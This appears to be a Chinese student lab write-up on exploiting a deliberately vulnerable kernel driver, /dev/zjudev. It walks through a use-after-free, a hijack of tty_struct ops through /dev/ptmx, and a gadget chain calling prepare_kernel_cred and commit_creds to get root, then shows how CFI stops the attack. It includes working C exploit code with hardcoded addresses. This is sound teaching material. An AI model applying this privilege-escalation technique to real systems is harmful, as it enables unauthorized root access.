
## 攻击思路
攻击的重点在于`/dev/ptmx`和`/dev/zjudev`。<br />由于内核中`zjudev`只有全局一个缓冲区，如果将设备打开两次，第二次打开的设备会覆盖第一次打开设备的缓冲区，且两次打开设备时候，我们可以获得指向同一个设备缓冲区的两个指针。<br />此时如果释放其中一个设备，由于在释放的时候指针没有置空，此时便可以通过另一个文件描述符操作该缓冲区对应的内存，即存在 UAF 漏洞。<br />同时实验提供的`ioctl`接口能够调整这个缓冲区大小。如果将其调整成内核中`tty_struct`的大小，完成上述操作后打开`/dev/ptmx`，内核会分配一个`tty_struct`结构体。当内核分配相同大小的数据结构时，便有可能使用这块由我们控制的缓冲区。<br />`zjudev`还为我们提供了`read`和`write`这块缓冲区的接口。由此我们便可以通过`write`来覆盖`/dev/ptmx`的 `const struct tty_operations *ops`字段，将其指向我们构建的一个形如`struct tty_operations`的结构体，这样在我们访问`/dev/ptmx`的某些接口的时候就会跳转到我们指定的函数中去，最终达到 root 权限的目的。

## Task 1
在 [tty.h L143](https://elixir.bootlin.com/linux/v5.15/source/include/linux/tty.h#L143) 中，我们可以看到`tty_struct`的定义（下图是部分内容）：
![image.png](./assets/1653829420926-8b6f53b0-0f87-4f22-b570-46c4fdac17c7.png)
我们关心的内容主要是`ops`：根据我们之前的讨论，我们的攻击方式就是更改这个字段。我们研究`ops`在`tty_struct`中的偏移；这里面唯一大小不明确的就是`kref`。我们追踪其定义：`struct kref` => `refcount_t` (`struct refcount_struct`) => `atomic_t` => `struct {int counter;}`，最终得知其大小就是一个`int`的大小，即 4 字节。因此，我们可以得出该结构体的基本排布：
![image.png](./assets/1653828539973-f9450cab-eb91-4d6e-9a43-0d151aa10be0.png)
当分配`tty_struct`时，`magic`字段就会被置为`0x5401`，因此我们判断最开始的 4 个字节的值是否为`0x5401`，就能够知道我们控制的指针指向的缓冲区是否被分配给了`tty_struct`了。

结合上述已知内容，我们可以编写如下的代码来完成上述内容并且验证我们的想法：
```c
int main() {
	int dev1 = open("/dev/zjudev", O_RDWR);
	int dev = open("/dev/zjudev", O_RDWR);
	
	ioctl(dev1, 0x0001, 0x2B8);
	close(dev1);
    
	int ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);
	
	char buf[TTY_STRUCT_SIZE] = {0};
	read(dev2, buf, TTY_STRUCT_SIZE - 1);

	int magic;
	memcpy(&magic, buf, 4);
	DEBUG(magic, XYX_YELLOW);
	
	if (magic != 0x5401)	;/* error */
	
	return 0;
}

```
在上面的代码中，打开两个`zjudev`，将其缓冲区大小调整为`tty_struct`的大小后关闭其中之一，保留另一个的文件描述符；尝试打开`/dev/ptmx`并检查`magic`的位置是否是`0x5401`，也就检查了缓冲区是否被分配给了`tty_struct`。


## Task 2
Task 2 要求我们利用`hack_cred`函数获取 root 权限。<br />在 [tty_driver.h L247](https://elixir.bootlin.com/linux/v5.15/source/include/linux/tty_driver.h#L247) 中查看，发现`struct tty_operations`由 36 个函数指针构成。我们查看 Task 1 中取到的`buf + 24`位置上的`ops`指针指向的内容：
![image.png](./assets/1653831940224-e712cfe1-8319-455c-9dad-05a0a39e0a7e.png)
其中第一个指针指向的是`lookup`函数指针，我们去看一下到底指的是哪个函数：
![image.png](./assets/1653832531098-d053ccd1-e558-49af-8f8e-804b655fcf62.png)
知道了这个函数的名字之后，我们去看一下它在 System.map 中的地址：
![image.png](./assets/1653832582914-ceabcb71-8ff7-4058-909f-5e093c66b4fa.png)
可以看到，在调试状态下好像并没有开 KASLR 。但是，如果需要绕过 KASLR，我们只需要对 Task1 中得到的`ops`做一次取值，就能得到`ptm_unix98_lookup`的地址，与`0xffff80001076c978`计算一下偏移就可以了。

进一步地，如我们之前分析的那样，我们想要构造一个自己的`struct tty_operations`，篡改之前的`ops`使其指向这个结构体，然后调用`ptmx`的某个接口从而实现调用`hack_cred`。<br />从 System.map 中，我们可以找到`hack_cred()`的地址`0xffff80001083aa84`：
![image.png](./assets/1653830088065-7b9c6267-cc13-4411-bfb7-39df51c8282f.png)

最终，我们编写了代码，可以成功获得 root 权限！
![image.png](./assets/1653836823332-4ebe8109-28c0-463c-974b-f753b52b080a.png)
可以看到，上面圈圈 1 的位置打开的`ptmx`的`tty_struct`并不在我们控制的 buffer 那里，因此我们开了第二次。然后我们伪造了一个`ops`，调用`write(ptmx)`，这样就会调用到我们的`hack_cred`了！

## Task 3
获取这些东西的地址：
![image.png](./assets/1653848847569-67e3d636-f600-4bd7-8c50-e08139e35cc6.png)

   - `0xffff80001083aa44` `zju_gadget1`
   - `0xffff80001083aa5c` `zju_gadget2`
   - `0xffff80001083aa74` `zju_gadget3`
   - `0xffff8000100b6030` `prepare_kernel_cred`
   - `0xffff8000100b5bac` `commit_creds`

我们最终想达到的目的就是调用`struct cred* root_cred = prepare_kernel_cred(NULL);`和`commit_creds(root_cred);`<br />我们写出这三个 gadget 的伪代码：
```c
gadget1 {
    x1 = *(x0 + 0x38);	// x0 + 7
    x0 = x2;
    goto x1;
}

gadget2 {
    x0 = 0;
    x1 = *(x2 + 0x28);	// x2 + 5
    goto x1;
}

gadget3 {
    return x0;
}
```

根据实验指导的 4.3.2 利用 ioctl 控制寄存器 一节，我们可以知道，当我们调用`ioctl(fd, p1, p2)`这个系统调用的时候，实际上会完成如下内容：
```c
int ioctl(int fd, unsigned long int p1, void *p2) {
    ioctl_operation(tty_struct_of_fd, p1, p2);
    // which will make x0 = tty_struct_of_fd, x1 = p1, x2 = p2
}
```

综合上述内容，结合实验指导的提示，我们梳理出如下的调用过程：

- 获取`tty_struct`的地址
   - 调用`ioctl(fd, _, _)`，这会使得`x0 = tty_struct_of_fd`；我们将`ops`中`ioctl`的函数指针改为 gadget3 的地址，这样它会直接返回，返回值即为`x0`，即`tty_struct_of_fd`。
- 调用`prepare_kernel_cred(NULL);`并记录返回值
   - 调用这个需要让`x0 = 0`，因此我们注意到 gadget2。它将`x0`置为 0，然后将`x1`置为`*(x2 + 0x28)`。因此我们可以让`x1 = prepare_kernel_cred`，这样就可以完成调用了。
   - 所以，我们需要让`x2`指向`ops`的某个位置，`+ 0x28`就会找到它之后 5 位的函数指针，我们将这个指针控制为`prepare_kernel_cred`即可。
   - 同时，我们还需要记录返回值。因此，我们再调用一次`ioctl(fd, _, p2)`。我们不妨将`ioctl`指针改为 gadget2 的地址；让`p2`就等于`ops`，这样我们将`ops[7]`设为`prepare_kernel_cred`的地址，就可以实现调用和记录返回值了。
- 调用`commit_creds(root_cred);`
   - 调用这个需要让`x0 = root_cred`，但是`ioctl`不能直接填`x0`。注意到 gadget1 可以让`x0 = x2`，因此可以使用它。
   - 类似之前的思路，我们将`ioctl`指针改为 gadget1 的地址，让`p2`等于前一步的返回值；调用`ioctl`会使得`x0 = tty_struct_of_fd`，而`x1`会被赋值为`*(x0 + 0x38)`，因此将`buf[7]`设为`commit_creds`的地址即可。

按照上述思路构建攻击代码后，发现并不能产生预期结果。查看调试信息发现，获取到的地址高位均为 0。分析得知，`ioctl`的返回值类型是 `int`，因此对于返回的地址信息，我们还需要将其对`0xffff000000000000`做按位或运算。
![image.png](./assets/1653895154442-66483aa2-c4da-4413-8fd2-15a40ee9c65e.png)

对应进行修改后，我们写出了这样的代码：
```c
// ==== Task 3 ====
const u64 gadget1Addr = 0xffff80001083aa44;
const u64 gadget2Addr = 0xffff80001083aa5c;
const u64 gadget3Addr = 0xffff80001083aa74;
const u64 pkcAddr = 0xffff8000100b6030;
const u64 ccAddr = 0xffff8000100b5bac;

void prepareTtyStruct(int dev);

int main() {
	DEBUG(buf, XYX_RED);
	// Task 1:
	int dev = ...
	int ptmx = ...
	
	// Task 3:
	memset(forgedOps, -1, sizeof forgedOps);
	
	char newBuf[0x40];
	u64 forgedOpsPtr = (u64)(&forgedOps);
	memcpy(newBuf, buf, 0x40);
	memcpy(newBuf + 24, &forgedOpsPtr, 8);
	memcpy(newBuf + 0x38, &ccAddr, 8);
	
	write(dev, newBuf, 0x40);
	
	// > Step 1:
	forgedOps[12] = gadget3Addr;
	u64 ttyAddr = ioctl(ptmx, 0, 0) | 0xffff000000000000;
	DEBUG(ttyAddr, XYX_RED);
	
	// > Step 2:
	forgedOps[12] = gadget2Addr;
	forgedOps[5] = pkcAddr;
	u64 credRetVal = ioctl(ptmx, 0, forgedOps) | 0xffff000000000000;
	DEBUG(credRetVal, XYX_CYAN);
	
	// > Step 3: (buf[7] has been set before)
	forgedOps[12] = gadget1Addr;
	ioctl(ptmx, 0, credRetVal);
	
	system("/bin/sh");
	
	return 0;
}
```

尝试编译运行，得到了正确的结果，获得了 root 权限！
![image.png](./assets/1653896028902-b86c4022-ebe2-4054-80d7-81c9254fa3a8.png)


## Task 4
运行攻击代码，在没有 cfi 的 image 上运行正常：
![image.png](./assets/1653969148343-24d21cff-160a-4f28-8955-b0a3e9c98c4a.png)
在有 cfi 的 image 上运行时，可以看到出现了错误。查看 dmesg，看到相关信息：
![image.png](./assets/1653968915042-0c8d98e9-309b-4a20-8336-3c70e129567f.png)
